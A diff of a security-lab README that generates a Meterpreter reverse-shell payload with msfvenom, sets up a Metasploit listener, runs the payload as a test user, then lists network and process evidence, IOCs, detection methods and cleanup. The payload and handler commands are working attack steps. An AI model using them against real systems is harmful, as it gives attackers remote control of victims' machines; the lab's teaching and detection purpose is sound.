@@ -41,19 +41,19 @@ This lab bridges offensive security concepts with defensive SOC analysis.
 - Linux system utilities  
 
 ##  Methodology
-### 1. Victim User Creation
+ 1. Victim User Creation
 A low-privilege user was created to simulate a real-world compromised account:
 ```bash
 sudo adduser victim --disabled-password --gecos ""
 
-### 2. Payload Generation
+ 2. Payload Generation
 
 A Linux Meterpreter reverse shell payload was generated:
 
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.121 LPORT=4444 -f elf -o shell64.elf
 chmod +x shell64.elf
 
-### 3. Metasploit Listener Setup
+3. Metasploit Listener Setup
 A handler was configured to receive the reverse connection:
 use exploit/multi/handler
 set PAYLOAD linux/x64/meterpreter/reverse_tcp
@@ -61,11 +61,11 @@ set LHOST 192.168.56.121
 set LPORT 4444
 run
 
-### 4 Payload Execution
+4 Payload Execution
 The payload was executed under the victim user:
 sudo -u victim /home/victim/shell64.elf
 
-### Results
+5 Results
 Network Evidence
 192.168.56.121:4444  → 192.168.56.121:49454  ESTABLISHED
 Interpretation:
@@ -73,53 +73,47 @@ Port 4444 = Metasploit listener (attacker)
 Port 49454 = victim outbound connection
 Status = active reverse shell session
 
-#<img width="4284" height="5712" alt="image00010" src="https://github.com/user-attachments/assets/ab3c91bc-fb4e-4f15-9138-1df567c8f5a1" />
 
-# Process Evidence
+6 Process Evidence
 ps aux | grep shell64
 Confirms execution of malicious binary
 Running under victim user context
 
-#<img width="1290" height="1468" alt="image00006" src="https://github.com/user-attachments/assets/a30d6a9f-4cc4-425c-9cad-b49d1cdaa4c6" />
 
-Network State
+7 Network State
 netstat -antp | grep 4444
 Shows active TCP connection
 Confirms Metasploit session handling via Ruby process
 
-Post-Exploitation Activity
-Inside Meterpreter session:
+8 nside Meterpreter session:
 getuid → confirms user identity
 sysinfo → system information
 pwd → working directory
 Insight:These commands simulate attacker reconnaissance after initial access.
 
-#<img width="1290" height="1468" alt="image00006" src="https://github.com/user-attachments/assets/f0c78494-64e2-492b-9a24-77942b34bf0b" />
-
-Indicators of Compromise (IOCs)
+9 Indicators of Compromise (IOCs)
 Execution of unknown binary (shell64.elf)
 Reverse connection on port 4444
 Suspicious process under non-root user
 Active outbound connection initiated internally
 Metasploit Ruby handler process
 
-SOC Analysis
+10 SOC Analysis
 This activity represents a:
 Reverse Shell Compromise with Command & Control communication
 
-Detection methods:
+11 Detection methods:
 Network traffic monitoring
 Endpoint process monitoring
 Port-based anomaly detection
 Suspicious binary execution alerts
-#<img width="4284" height="5712" alt="image00008" src="https://github.com/user-attachments/assets/c9078459-6405-4e1e-80a4-06ac5c34801d" />
 
-Cleanup
+12 Cleanup
 sudo pkill -u victim
 sudo rm -f /home/victim/shell64.elf
 sudo deluser --remove-home victim
 
-Key Learnings
+13 Key Learnings
 Reverse shells initiate outbound connections from victim systems
 Metasploit acts as a C2 framework
 SOC analysts detect compromise through network + process correlation
